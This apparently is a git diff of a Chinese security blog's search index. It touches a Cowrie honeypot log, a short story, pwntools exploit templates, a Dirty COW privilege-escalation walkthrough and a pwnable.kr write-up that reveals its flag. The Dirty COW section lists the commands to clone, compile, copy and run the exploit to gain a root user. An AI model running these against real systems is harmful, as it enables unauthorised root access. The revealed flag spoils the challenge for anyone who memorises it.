class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:06:36.753434Z"</span>,<span class="string">"session"</span>:<span class="string">"d567119597cd"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.169"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:06:39.353825Z"</span>,<span class="string">"session"</span>:<span class="string">"936d663f58e3"</span>}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>var<span class="regexp">/log/</span>cowrie/cowrie.json | <span class="keyword">grep</span> success</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.164&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:05:03.511816Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;86db2c24adca&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.210&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:05:05.757924Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;ccf709714130&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.169&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:05:10.460597Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;83c13f52700e&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.169&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:05:34.359839Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;7758eebae3a3&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;193.32.161.176&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:05:35.328376Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;6dd4c70d1f51&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.220&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:06:33.090110Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;df7da3aa3ca1&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.210&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:06:36.753434Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;d567119597cd&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;5.188.86.169&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;sensor&quot;</span>:<span class="string">&quot;vultr.guest&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;login attempt [root/root] succeeded&quot;</span>,<span class="string">&quot;eventid&quot;</span>:<span class="string">&quot;cowrie.login.success&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2019-09-03T12:06:39.353825Z&quot;</span>,<span class="string">&quot;session&quot;</span>:<span class="string">&quot;936d663f58e3&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 <p>其实还有别的一些接收outputs的方法，时间紧迫，留作以后继续研究，留个盼头嘛٩(๑&gt;◡&lt;๑)۶ </p>
-<h4 id="中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。"><a href="#中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。" class="headerlink" title="中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。"></a>中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。</h4><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+<h4 id="中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。"><a href="#中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。" class="headerlink" title="中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。"></a>中间采坑无数，网上的众多教程由于版本过老，很多没能成功，此博客记录自己搭建成功的过程，留作日后复现。</h4>]]></content>
       <categories>
         <category>渗透</category>
       </categories>
@@ -705,25 +685,7 @@
 <p>“什么诗？”李一涵博士惊讶地问，甚至没发觉面前的机器人少有地用了倒装句。</p>
 <p>“世界微尘里，吾宁爱与憎。”</p>
 <p>然后小虎就再也没有开口，两颗眼睛像满是星辰的黑夜。</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>文苑</category>
       </categories>
@@ -735,40 +697,22 @@
     <title>通用pwn exp脚本</title>
     <url>/%E7%94%A8pwn-exp%E8%84%9A%E6%9C%AC.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><pre><code>from pwn import *
-context.log_level = 'debug'
-io = process("")
-code = ELF("")
-#lib = ELF("./bc.so.6")
-#r = remote("")
+context.log_level = &#39;debug&#39;
+io = process(&quot;&quot;)
+code = ELF(&quot;&quot;)
+#lib = ELF(&quot;./bc.so.6&quot;)
+#r = remote(&quot;&quot;)
 def debug():
     print io.pid
     pause()
-def gdb(script = ''):
+def gdb(script = &#39;&#39;):
     gdb.attach(io, gdbscrippt = script)
 
 def exploit():
 
     io.interactive()
 exploit()</code></pre>
-<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">io = process(<span class="string">"./"</span>)</span><br><span class="line"><span class="comment">#io = remote("",)</span></span><br><span class="line">libc = ELF(<span class="string">"./bc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'4'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your id:"</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your id:"</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your id:"</span>,str(num))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="keyword">print</span> io.pid</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">script=<span class="string">''</span></span>):</span></span><br><span class="line">    gdb.attach(io, gdbscript=script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&quot;./&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;&quot;,)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./bc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input your id:&quot;</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input your id:&quot;</span>,str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input your id:&quot;</span>,str(num))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="keyword">print</span> io.pid</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">script=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io, gdbscript=script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>pwn</category>
       </categories>
@@ -784,7 +728,7 @@ exploit()</code></pre>
 <h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><h4 id="漏洞范围："><a href="#漏洞范围：" class="headerlink" title="漏洞范围："></a>漏洞范围：</h4><p>Linux kernel &gt;= 2.6.22</p>
 <h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h4><p>低权限用户利用本漏洞在linux系统是实现本地提权<br>远程入侵获得低权限之后，才能进一步提权。</p>
 <h4 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h4><p>从 2007 年发布 2.6.22 版本开始，直到2016年10月18日为止，这中间发行的所有 Linux 系统都受影响。</p>
-<h5 id="查看方式："><a href="#查看方式：" class="headerlink" title="查看方式："></a>查看方式：</h5><figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">===&gt; Linux AYxxxx <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 #<span class="number">1</span> SMP Thu Jul <span class="number">31</span> <span class="number">17</span>:<span class="number">20</span>:<span class="number">51</span> UTC <span class="number">2014</span> x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="查看方式："><a href="#查看方式：" class="headerlink" title="查看方式："></a>查看方式：</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">===&gt; Linux AYxxxx <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 #<span class="number">1</span> SMP Thu Jul <span class="number">31</span> <span class="number">17</span>:<span class="number">20</span>:<span class="number">51</span> UTC <span class="number">2014</span> x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
 
 <h5 id="简单辨别："><a href="#简单辨别：" class="headerlink" title="简单辨别："></a>简单辨别：</h5><table>
 <thead>
@@ -834,31 +778,13 @@ exploit()</code></pre>
 <td>8.0.4</td>
 </tr>
 </tbody></table>
-<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="本地编译dirtycow发送至目标机"><a href="#本地编译dirtycow发送至目标机" class="headerlink" title="本地编译dirtycow发送至目标机"></a>本地编译dirtycow发送至目标机</h3><figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>FireFart/dirtycow.git</span><br><span class="line"></span><br><span class="line">cd dirtycow</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">scp dirty test<span class="variable">@192</span>.<span class="number">168.165</span>.<span class="number">224</span><span class="symbol">:/home/test/dirty</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="本地编译dirtycow发送至目标机"><a href="#本地编译dirtycow发送至目标机" class="headerlink" title="本地编译dirtycow发送至目标机"></a>本地编译dirtycow发送至目标机</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>FireFart/dirtycow.git</span><br><span class="line"></span><br><span class="line">cd dirtycow</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">scp dirty test<span class="variable">@192</span>.<span class="number">168.165</span>.<span class="number">224</span><span class="symbol">:/home/test/dirty</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="ssh连接后创建root用户"><a href="#ssh连接后创建root用户" class="headerlink" title="ssh连接后创建root用户"></a>ssh连接后创建root用户</h3><figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line">ssh <span class="symbol">test@</span><span class="number">192.168</span><span class="number">.165</span><span class="number">.224</span></span><br><span class="line"></span><br><span class="line">./dirty asdfg(root_user_passwd)</span><br><span class="line"><span class="comment">//waiting......</span></span><br><span class="line"></span><br><span class="line">su firefart</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="ssh连接后创建root用户"><a href="#ssh连接后创建root用户" class="headerlink" title="ssh连接后创建root用户"></a>ssh连接后创建root用户</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">test@</span><span class="number">192.168</span><span class="number">.165</span><span class="number">.224</span></span><br><span class="line"></span><br><span class="line">./dirty asdfg(root_user_passwd)</span><br><span class="line"><span class="comment">//waiting......</span></span><br><span class="line"></span><br><span class="line">su firefart</span><br></pre></td></tr></table></figure>
 
 <p>Congratulations！！</p>
 <p>当然，更多的还是现场尝试，因为很多的系统已经修复漏洞。</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>渗透</category>
       </categories>
@@ -878,29 +804,29 @@ exploit()</code></pre>
     #include &lt;stdlib.h&gt;
     #include &lt;string.h&gt;
     char buf[32];
-    int main(int argc, char* argv[], char* envp[]){
-        if(argc&lt;2){
-            printf("pass argv[1] a number\n");
+    int main(int argc, char* argv[], char* envp[])&#123;
+        if(argc&lt;2)&#123;
+            printf(&quot;pass argv[1] a number\n&quot;);
             return 0;
-        }
+        &#125;
 
 
 
         int fd = atoi( argv[1] ) - 0x1234;
         int len = 0;
         len = read(fd, buf, 32);
-        if(!strcmp("LETMEWIN\n", buf)){
-            printf("good job :)\n");
-            system("/bin/cat flag");
+        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;
+            printf(&quot;good job :)\n&quot;);
+            system(&quot;/bin/cat flag&quot;);
             exit(0);
-        }
+        &#125;
 
 
 
-        printf("learn about Linux file IO\n");
+        printf(&quot;learn about Linux file IO\n&quot;);
         return 0;
 
-    }</code></pre>
+    &#125;</code></pre>
 <h3 id="关键参数解读："><a href="#关键参数解读：" class="headerlink" title="关键参数解读："></a>关键参数解读：</h3><p>首先main函数使用了带参数的形式：<code>int main(int argc, char* argv[], char* envp[])</code></p>
 <ul>
 <li><p>argc: 参数的个数，不给main()函数传递参数时默认值为1，即至少有一个参数为该可执行文件的文件名（含目录）。</p>
@@ -912,40 +838,22 @@ exploit()</code></pre>
 </ul>
 <p>假设有一个文件名为1.sh的文件中主函数声明为int main(int argc , char* argv[] )的形式，如果调用时使用<br>        <code>root@kali-linux:~# ./1.sh hahaha xixixi hehehe</code>的形式，则此时:<br>        argc的值为4，argv[0]为“1.sh” ，argv[1]为“hahaha”，argv[2]为“xixixi”，argv[3]为“hehehe” 。</p>
 <hr>
-<h4 id="atoi-函数"><a href="#atoi-函数" class="headerlink" title="atoi()函数"></a>atoi()函数</h4><p><code>int atoi(const char *str)</code>&nbsp;</p>
-<p>函数说明：把参数&nbsp;str&nbsp;所指向的字符串转换为一个整数（类型为 int 型）</p>
+<h4 id="atoi-函数"><a href="#atoi-函数" class="headerlink" title="atoi()函数"></a>atoi()函数</h4><p><code>int atoi(const char *str)</code> </p>
+<p>函数说明：把参数 str 所指向的字符串转换为一个整数（类型为 int 型）</p>
 <h4 id="read-函数"><a href="#read-函数" class="headerlink" title="read()函数"></a>read()函数</h4><p><code>ssize_t read(int fd, void * buf, size_t count);</code>  </p>
 <p>函数说明：read()会把参数fd所指的文件传送count 个字节到buf 指针所指的内存中。</p>
 <p>返回值：返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据。若参数count 为0, 则read()不会有作用并返回0。</p>
 <h6 id="注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。"><a href="#注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。" class="headerlink" title="注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。"></a>注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。</h6><h4 id="解读："><a href="#解读：" class="headerlink" title="解读："></a>解读：</h4><h5 id="1-读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN-n”的文件就可以实现了。但是好像比较麻烦。"><a href="#1-读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN-n”的文件就可以实现了。但是好像比较麻烦。" class="headerlink" title="1.读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN\n”的文件就可以实现了。但是好像比较麻烦。"></a>1.读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN\n”的文件就可以实现了。但是好像比较麻烦。</h5><h5 id="2-题目提示：文件描述符（file-description）"><a href="#2-题目提示：文件描述符（file-description）" class="headerlink" title="2.题目提示：文件描述符（file description）"></a>2.题目提示：文件描述符（file description）</h5><h5 id="关于文件描述符："><a href="#关于文件描述符：" class="headerlink" title="关于文件描述符："></a>关于文件描述符：</h5><p><img src="/images/pasted-3.png" alt="upload successful"></p>
 <h5 id="fd-0时直接就是standard-input，美滋滋。"><a href="#fd-0时直接就是standard-input，美滋滋。" class="headerlink" title="fd=0时直接就是standard input，美滋滋。"></a>fd=0时直接就是standard input，美滋滋。</h5><h5 id="直接就是int-fd-atoi-argv-1-0x1234的值为0，然后带一个参数即可。"><a href="#直接就是int-fd-atoi-argv-1-0x1234的值为0，然后带一个参数即可。" class="headerlink" title="直接就是int fd = atoi( argv[1] ) - 0x1234的值为0，然后带一个参数即可。"></a>直接就是<code>int fd = atoi( argv[1] ) - 0x1234</code>的值为0，然后带一个参数即可。</h5><h5 id="另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi-函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。"><a href="#另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi-函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。" class="headerlink" title="另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi()函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。"></a>另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi()函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。</h5><p><img src="/images/pasted-4.png" alt="upload successful"></p>
-<h4 id="flag-mommy-I-think-I-know-what-a-file-descriptor-is"><a href="#flag-mommy-I-think-I-know-what-a-file-descriptor-is" class="headerlink" title="flag:mommy! I think I know what a file descriptor is!!"></a>flag:<code>mommy! I think I know what a file descriptor is!!</code></h4><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+<h4 id="flag-mommy-I-think-I-know-what-a-file-descriptor-is"><a href="#flag-mommy-I-think-I-know-what-a-file-descriptor-is" class="headerlink" title="flag:mommy! I think I know what a file descriptor is!!"></a>flag:<code>mommy! I think I know what a file descriptor is!!</code></h4>]]></content>
       <categories>
         <category>学习</category>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>pwnable</tag>
         <tag>文件描述符</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1024,25 +932,7 @@ exploit()</code></pre>
 <li>记得开放阿里云安全组策略</li>
 <li>客户端和服务器端需要使用相同的frp版本</li>
 </ul>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>学习</category>
       </categories>
